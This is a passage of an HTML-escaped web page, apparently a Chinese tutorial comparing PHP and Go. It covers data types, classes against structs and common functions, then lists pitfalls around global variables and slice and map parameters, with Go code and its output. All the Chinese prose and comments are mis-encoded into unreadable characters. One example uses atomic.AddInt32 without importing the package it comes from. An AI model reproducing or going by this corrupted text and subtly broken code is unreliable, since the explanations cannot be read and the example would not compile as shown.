[6]int32{}&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;slice(åˆ‡ç‰‡)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;åŒä¸Šï¼ŒPHPå«ç´¢å¼•æ•°æ®&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varSlice []int32 = []int32{}&lt;/span&gt;&lt;/code&gt;&lt;span&gt;åˆ‡ç‰‡ç›¸å¯¹äºæ•°æ®ä¼šè‡ªåŠ¨æ‰©å®¹&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;map&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varMap = array(&#x27;key&#x27; =&amp;gt; &#x27;value&#x27;);&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varMap map[string]int32 = map[string]int32{}&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;closure(é—­åŒ…)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varClosure = function() {};&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varClosure func() = func() {}&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;channel&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ— &lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varChannel chan string = make(chan string)&lt;/span&gt;&lt;/code&gt;&lt;span&gt;Â æ— ç¼“å­˜channelï¼›&lt;br/&gt;&lt;/span&gt;&lt;code&gt;&lt;span&gt;var varChannelBuffer chan string = make(chan string, 6)&lt;/span&gt;&lt;/code&gt;&lt;span&gt;æœ‰ç¼“å­˜channel&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 data-line=&quot;116&quot;&gt;&lt;span&gt;PHPç±»çš„å®ä¾‹åŒ–å’ŒGoç»“æ„ä½“çš„åˆå§‹åŒ–çš„å¯¹æ¯”&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;118&quot;&gt;&lt;span&gt;PHPç±»çš„å®ä¾‹åŒ–&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;119&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;/* &lt;br/&gt;å®šä¹‰class&lt;br/&gt;*/&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;ClassDemo&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;// ç§æœ‰å±æ€§&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;$privateVar&lt;/span&gt; = &lt;span&gt;&quot;&quot;&lt;/span&gt;;&lt;br/&gt;    &lt;span&gt;// å…¬æœ‰å±æ€§&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;$publicVar&lt;/span&gt; = &lt;span&gt;&quot;&quot;&lt;/span&gt;;&lt;br/&gt;    &lt;span&gt;// æ„é€ å‡½æ•°&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;__construct&lt;/span&gt;()&lt;br/&gt;    &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;// å®ä¾‹åŒ–ç±»æ—¶æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;    }&lt;br/&gt;    &lt;span&gt;// ç§æœ‰æ–¹æ³•&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;privateFun&lt;/span&gt;()&lt;br/&gt;    &lt;/span&gt;{&lt;br/&gt;    &lt;br/&gt;    }&lt;br/&gt;    &lt;span&gt;// å…¬æœ‰æ–¹æ³•&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;function&lt;/span&gt; &lt;span&gt;publicFun&lt;/span&gt;()&lt;br/&gt;    &lt;/span&gt;{&lt;br/&gt;    &lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å®ä¾‹åŒ–ç±»ClassDemo è·å–ç±»ClassDemoçš„å¯¹è±¡&lt;/span&gt;&lt;br/&gt;&lt;span&gt;$varObject&lt;/span&gt; = &lt;span&gt;new&lt;/span&gt; ClassDemo(); &lt;span&gt;// å¯¹è±¡(ç±»)&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;149&quot;&gt;&lt;span&gt;Goç»“æ„ä½“çš„åˆå§‹åŒ–&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;150&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;// åŒ…åˆå§‹åŒ–æ—¶æ‰§è¡Œ&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;init&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; StructDemo &lt;span&gt;struct&lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;// å°å†™å¼€å¤´é©¼å³°è¡¨ç¤ºç§æœ‰å±æ€§&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;// ä¸å¯å¯¼å‡º&lt;/span&gt;&lt;br/&gt;    privateVar &lt;span&gt;string&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;// å¤§å†™å¼€å¤´é©¼å³°è¡¨ç¤ºå…¬æœ‰å±æ€§&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;// å¯å¯¼å‡º&lt;/span&gt;&lt;br/&gt;    PublicVar &lt;span&gt;string&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å°å†™å¼€å¤´é©¼å³°è¡¨ç¤ºç§æœ‰æ–¹æ³•&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ç»“æ„ä½“StructDemoçš„ç§æœ‰æ–¹æ³•&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(demo *StructDemo)&lt;/span&gt; &lt;span&gt;privateFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;error&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å¤§å†™å¼€å¤´é©¼å³°è¡¨ç¤ºå…¬æœ‰å±æ€§&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ç»“æ„ä½“StructDemoçš„å…¬æœ‰æ–¹æ³•&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;(demo *StructDemo)&lt;/span&gt; &lt;span&gt;PublicFun&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;error&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// åˆå§‹åŒ–ç»“æ„ä½“StructDemo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// structDemo := &amp;amp;StructDemo{}&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;181&quot;&gt;&lt;span&gt;å¸¸ç”¨å‡½æ•°å¯¹æ¯”&lt;/span&gt;&lt;/h2&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;å¸¸ç”¨å‡½æ•°æè¿°&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;PHP&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;Go&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ•°ç»„é•¿åº¦&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;count()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;len()&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;åˆ†å‰²å­—ç¬¦ä¸²ä¸ºæ•°ç»„&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;explode()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strings.Split(s string, sep string) []string&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;è½¬å¤§å†™&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strtoupper()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strings.ToUpper(s string) string&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;è½¬å°å†™&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strtolower()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strings.ToLower(s string) string&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;å»é™¤ç©ºæ ¼&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;trim()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;strings.Trim(s, cutset string) string&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;jsonåºåˆ—åŒ–&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;json_encode()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;json.Marshal(v interface{}) ([]byte, error)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;jsonååºåˆ—åŒ–&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;json_decode()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;json.Unmarshal(data []byte, v interface{}) error&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;åºåˆ—åŒ–(ä¸å†å»ºè®®ä½¿ç”¨)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;serialize()ã€unserialize()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;åŒ…https://github.com/wulijun/go-php-serialize&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;md5&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;md5()&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;åŒ…crypto/md5&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;ç»ˆç«¯è¾“å‡º&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;echoã€var_dumpç­‰&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;fmt.Println(a ...interface{})&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;å„ç§ç±»å‹äº’è½¬&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;intval()ç­‰&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;åŒ…strconv&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h1 data-line=&quot;197&quot;&gt;&lt;span&gt;é¿å‘æŒ‡å—&lt;/span&gt;&lt;/h1&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;è°¨æ…ä½¿ç”¨å…¨å±€å˜é‡ï¼Œå…¨å±€å˜é‡ä¸ä¼šåƒPHPä¸€æ ·ï¼Œåœ¨å®Œæˆä¸€æ¬¡è¯·æ±‚ä¹‹åè¢«é”€æ¯&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;å½¢å‚æ˜¯sliceã€mapç±»å‹çš„å‚æ•°ï¼Œæ³¨æ„å€¼å¯è¢«å…¨å±€ä¿®æ”¹&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;èµ„æºä½¿ç”¨å®Œæ¯•ï¼Œè®°å¾—é‡Šæ”¾èµ„æºæˆ–å›æ”¶èµ„æº&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;ä¸è¦ä¾èµ–mapéå†çš„é¡ºåº&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;ä¸è¦å¹¶å‘å†™map&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;æ³¨æ„åˆ¤æ–­æŒ‡é’ˆç±»å‹ä¸ä¸ºç©ºnilï¼Œå†æ“ä½œ&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;Goè¯­è¨€ä¸æ”¯æŒç»§æ‰¿ï¼Œä½†æ˜¯æœ‰åˆæˆå¤ç”¨&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h2 data-line=&quot;207&quot;&gt;&lt;span&gt;1. è°¨æ…ä½¿ç”¨å…¨å±€å˜é‡ï¼Œå…¨å±€å˜é‡ä¸ä¼šåƒPHPä¸€æ ·ï¼Œåœ¨å®Œæˆä¸€æ¬¡è¯·æ±‚ä¹‹åè¢«é”€æ¯&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code data-line=&quot;209&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;github.com/gin-gonic/gin&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// å…¨å±€å˜é‡ä¸ä¼šåƒPHPä¸€æ ·ï¼Œåœ¨å®Œæˆä¸€æ¬¡è¯·æ±‚ä¹‹åè¢«é”€æ¯&lt;/span&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; GlobalVarDemo &lt;span&gt;int32&lt;/span&gt; = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æ¨¡æ‹Ÿæ¥å£é€»è¾‘&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;r := gin.Default()&lt;br/&gt;r.GET(&lt;span&gt;&quot;/ping&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;atomic.AddInt32(&amp;amp;GlobalVarDemo,1)&lt;br/&gt;c.JSON(&lt;span&gt;200&lt;/span&gt;, gin.H{&lt;br/&gt;&lt;span&gt;&quot;message&quot;&lt;/span&gt;: GlobalVarDemo,&lt;br/&gt;})&lt;br/&gt;})&lt;br/&gt;r.Run()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// æˆ‘ä»¬å¤šæ¬¡è¯·æ±‚æ¥å£ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾å‘ç°ï¼šå…¨å±€å˜é‡ä¸ä¼šåƒPHPä¸€æ ·ï¼Œåœ¨å®Œæˆä¸€æ¬¡è¯·æ±‚ä¹‹åè¢«é”€æ¯ã€‚&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ä½†æ˜¯PHPä¸ä¸€æ ·ï¼Œå…¨å±€å˜é‡åœ¨å®Œæˆä¸€æ¬¡è¯·æ±‚ä¹‹åä¼šè¢«è‡ªåŠ¨é”€æ¯ã€‚&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// curl &quot;127.0.0.1:8080/ping&quot; &lt;/span&gt;&lt;br/&gt;&lt;span&gt;// {&quot;message&quot;:1}                                                                     &lt;/span&gt;&lt;br/&gt;&lt;span&gt;// curl &quot;127.0.0.1:8080/ping&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// {&quot;message&quot;:2} &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt;&lt;span&gt; å€¼åœ¨é€’å¢&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// curl &quot;127.0.0.1:8080/ping&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// {&quot;message&quot;:3} &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; å€¼åœ¨é€’å¢&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;241&quot;&gt;&lt;span&gt;2. å½¢å‚æ˜¯&lt;/span&gt;&lt;code&gt;&lt;span&gt;slice&lt;/span&gt;&lt;/code&gt;&lt;span&gt;ã€&lt;/span&gt;&lt;code&gt;&lt;span&gt;map&lt;/span&gt;&lt;/code&gt;&lt;span&gt;ç±»å‹çš„å‚æ•°ï¼Œæ³¨æ„å€¼å¯è¢«å…¨å±€ä¿®æ”¹&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;243&quot;&gt;&lt;p data-line=&quot;243&quot;&gt;&lt;span&gt;ç±»ä¼¼PHPçš„å¼•ç”¨ä¼ é€’ï¼ŒGoé‡Œé¢éƒ½æ˜¯å€¼ä¼ é€’ï¼Œå…·ä½“åŸå› ä¸‹é¢è¯´&lt;/span&gt;&lt;span&gt;ã€‚&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;245&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;// åˆ‡ç‰‡&lt;/span&gt;&lt;br/&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; &lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo := []&lt;span&gt;int32&lt;/span&gt;{&lt;span&gt;1&lt;/span&gt;}&lt;br/&gt;fmt.Printf(&lt;span&gt;&quot;main.paramDemo 1 %v, pointer: %p \n&quot;&lt;/span&gt;, paramDemo, &amp;amp;paramDemo)&lt;br/&gt;&lt;span&gt;// æµ…æ‹·è´&lt;/span&gt;&lt;br/&gt;demo(paramDemo)&lt;br/&gt;fmt.Printf(&lt;span&gt;&quot;main.paramDemo 2 %v, pointer: %p \n&quot;&lt;/span&gt;, paramDemo, &amp;amp;paramDemo)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;demo&lt;/span&gt;&lt;span&gt;(paramDemo []&lt;span&gt;int32&lt;/span&gt;)&lt;/span&gt; &lt;span&gt;([]&lt;span&gt;int32&lt;/span&gt;, error)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;fmt.Printf(&lt;span&gt;&quot;main.demo.paramDemo pointer: %p \n&quot;&lt;/span&gt;, &amp;amp;paramDemo)&lt;br/&gt;paramDemo[&lt;span&gt;0&lt;/span&gt;] = &lt;span&gt;2&lt;/span&gt;&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; paramDemo, &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 1 [1], pointer: 0xc00000c048&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.demo.paramDemo pointer: 0xc00000c078 &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; å†…å­˜åœ°å€ä¸ä¸€æ ·ï¼Œå‘ç”Ÿäº†å€¼æ‹·è´&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;// main.paramDemo 2 [2] &lt;/span&gt;&lt;span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; åŸå€¼è¢«ä¿®æ”¹&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 1 [1], pointer: 0xc0000a6030&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.demo.paramDemo pointer: 0xc0000a6060 &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; å†…å­˜åœ°å€ä¸ä¸€æ ·ï¼Œå‘ç”Ÿäº†å€¼æ‹·è´&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;// main.paramDemo 2 [2], pointer: 0xc0000a6030 &lt;/span&gt;&lt;span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; åŸå€¼è¿˜æ˜¯è¢«ä¿®æ”¹äº†&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;//===========æ•°ç»„å°±æ²¡æœ‰è¿™ä¸ªé—®é¢˜===========&lt;/span&gt;&lt;br/&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; &lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo := [&lt;span&gt;1&lt;/span&gt;]&lt;span&gt;int32&lt;/span&gt;{&lt;span&gt;1&lt;/span&gt;}&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 1&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;demo(paramDemo)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 2&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;demo&lt;/span&gt;&lt;span&gt;(paramDemo [1]&lt;span&gt;int32&lt;/span&gt;)&lt;/span&gt; &lt;span&gt;([1]&lt;span&gt;int32&lt;/span&gt;, error)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo[&lt;span&gt;0&lt;/span&gt;] = &lt;span&gt;2&lt;/span&gt;&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; paramDemo, &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 1 [1]&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 2 [1] &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&amp;lt;-------&lt;/span&gt;&lt;span&gt; å€¼æœªè¢«ä¿®æ”¹&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;//===========MapåŒæ ·æœ‰è¿™ä¸ªé—®é¢˜===========&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; &lt;span&gt;&quot;fmt&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo := &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;{&lt;br/&gt;&lt;span&gt;&quot;a&quot;&lt;/span&gt;: &lt;span&gt;&quot;a&quot;&lt;/span&gt;,&lt;br/&gt;}&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 1&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;demo(paramDemo)&lt;br/&gt;fmt.Println(&lt;span&gt;&quot;main.paramDemo 2&quot;&lt;/span&gt;, paramDemo)&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;demo&lt;/span&gt;&lt;span&gt;(paramDemo &lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;)&lt;/span&gt; &lt;span&gt;(&lt;span&gt;map&lt;/span&gt;[&lt;span&gt;string&lt;/span&gt;]&lt;span&gt;string&lt;/span&gt;, error)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;paramDemo[&lt;span&gt;&quot;a&quot;&lt;/span&gt;] = &lt;span&gt;&quot;b&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; paramDemo, &lt;span&gt;nil&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// [Running] go run &quot;.../demo/main.go&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 1 map[a:a]&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// main.paramDemo 2 map[a:b] &lt;/span&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;------- å€¼è¢«ä¿®æ”¹&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-line=&quot;322&quot;&gt;&lt;p data-line=&quot;322&quot;&gt;&lt;span&gt;ä¸ºä»€ä¹ˆï¼Ÿ&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;324&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;ç­”ï¼šGoè¯­è¨€éƒ½æ˜¯å€¼ä¼ é€’ï¼Œæµ…å¤åˆ¶è¿‡ç¨‹ï¼Œsliceå’Œmapåº•å±‚çš„ç±»å‹æ˜¯ä¸ªç»“æ„ä½“ï¼Œå®é™…å­˜å‚¨å€¼çš„ç±»å‹æ˜¯ä¸ªæŒ‡é’ˆã€‚&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code data-line=&quot;328&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;// versions/1.13.8/src/runtime/slice.go&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// sliceæºç ç»“æ„ä½“&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; slice &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;    array unsafe.Pointer &lt;span&gt;// å®é™…å­˜å‚¨å€¼çš„ç±»å‹æ˜¯ä¸ªæŒ‡é’ˆ&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;len&lt;/span&gt;   &lt;span&gt;int&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;cap&lt;/span&gt;   &lt;span&gt;int&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// versions/1.13.8/src/runtime/map.go&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// mapæºç ç»“æ„ä½“&lt;/span&gt;&lt;br/&gt;&lt;span&gt;type&lt;/span&gt; hmap &lt;span&gt;struct&lt;/span&gt; {&lt;br/&gt;    count     &lt;span&gt;int&lt;/span&gt;&lt;br/&gt;    flags     &lt;span&gt;uint8&lt;/span&gt;&lt;br/&gt;    B         &lt;span&gt;uint8&lt;/span&gt;&lt;br/&gt;    noverflow 